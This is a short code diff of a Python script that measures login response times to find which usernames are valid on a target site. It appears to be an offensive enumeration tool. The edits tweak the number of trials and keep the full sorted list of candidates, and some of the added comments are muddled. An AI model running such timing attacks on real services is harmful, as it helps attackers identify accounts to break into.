@@ -4,7 +4,7 @@ import time
 import sys
 from bs4 import BeautifulSoup
 
-def run_test(username: str, password: str, url: str, ip: str, trials: int = 3) -> float:
+def run_test(username: str, password: str, url: str, ip: str, trials: int = 3) -> float: # trials=3 to trials=5/7/10 to reduce jitter, but 3 is quickest to users (10 statistically)
     """
     Measures average response time for login attempts to detect timing discrepancies
     which may indicate a valid username.
@@ -93,8 +93,8 @@ for name in usernames:
     print(f"[i] Tried {name:<15} | Avg Time: {avg_time:.4f}s")
     ip_counter += 1
 
-# Get top 3 usernames by timing
-top_candidates = sorted(username_timing.items(), key=lambda item: item[1], reverse=True)[:3]
+# Sort usernames by timing, used to get top 3
+top_candidates = sorted(username_timing.items(), key=lambda item: item[1], reverse=True) # [:3] commented out for guaranteed run; [:20] best margin for noisy data
 print("\n[+] Top candidates:")
 for u, t in top_candidates:
     print(f"    {u:<15} | {t:.4f}s")
